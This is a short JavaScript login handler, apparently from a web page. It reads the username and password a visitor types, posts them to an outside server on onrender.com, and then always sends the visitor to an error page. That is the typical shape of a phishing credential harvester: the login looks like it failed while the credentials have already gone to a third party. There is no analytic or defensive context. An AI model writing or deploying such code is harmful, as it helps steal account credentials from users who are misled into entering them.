
    async function login() {
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        try {
            // Send username and password to backend
            await fetch("https://backend-redf.onrender.com/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username, password })
            });

            // Redirect to error.html always
            window.location.href = "error.html";
        } catch (error) {
            console.error("Error:", error);
            alert("Something went wrong!");
        }
    }
